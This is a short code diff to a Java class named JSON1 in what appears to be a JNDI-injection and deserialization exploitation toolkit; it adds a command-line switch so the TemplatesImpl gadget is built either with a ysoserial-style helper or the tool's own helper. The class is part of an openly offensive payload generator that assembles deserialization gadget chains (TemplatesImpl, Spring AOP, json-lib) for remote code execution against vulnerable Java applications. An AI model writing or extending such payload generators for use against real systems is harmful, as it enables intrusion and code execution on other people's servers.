@@ -4,6 +4,7 @@ import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import net.sf.json.JSONObject;
 import org.springframework.aop.framework.AdvisedSupport;
@@ -13,6 +14,8 @@ import javax.xml.transform.Templates;
 import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
+
+import static com.qi4l.jndi.Starter.cmdLine;
 
 /**
  * A bit more convoluted example
@@ -55,7 +58,12 @@ import java.util.Map;
 public class JSON1 implements ObjectPayload<Object>{
 
     public Object getObject(PayloadType type, String... param) throws Exception {
-        Object tql    = Gadgets.createTemplatesImpl(type, param);
+        final Object tql;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            tql = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            tql = Gadgets.createTemplatesImpl(type, param);
+        }
         Class  ifaces = Templates.class;
         CompositeType rt = new CompositeType("a", "b",
                 new String[]{"a"},
